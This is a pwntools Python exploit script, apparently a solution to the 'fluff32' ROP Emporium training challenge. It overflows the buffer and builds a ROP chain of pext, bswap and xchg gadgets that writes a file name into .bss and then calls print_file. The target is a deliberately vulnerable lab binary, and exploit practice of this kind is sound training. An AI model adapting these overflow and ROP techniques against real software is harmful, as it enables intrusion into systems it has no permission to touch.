#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# pyright: reportUndefinedVariable=false
from pwn import *

exe = context.binary = ELF("fluff32")


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


gdbscript = """
b *0x8048555
continue
""".format(
    **locals()
)

_bss = 0x0804A020
pop_ecx_bswap = 0x08048558
pop_ebp = 0x080485BB
pext = 0x08048543
xchg = 0x08048555

masks = [0xB4B, 0x2DD, 0x1D46, 0xB5A, 0x1DB, 0xACD, 0x1AC5, 0xACD]

pay = b"\x90" * 44

for _ in range(len(masks)):
    pay += p32(pop_ebp)
    pay += p32(masks[_])
    pay += p32(pext)
    pay += p32(pop_ecx_bswap)
    pay += p32(_bss + _, endian="big")
    pay += p32(xchg)

pay += p32(exe.sym.print_file)
pay += p32(0x0)
pay += p32(_bss)

io = start()
io.clean()
io.sendline(pay)
io.interactive()
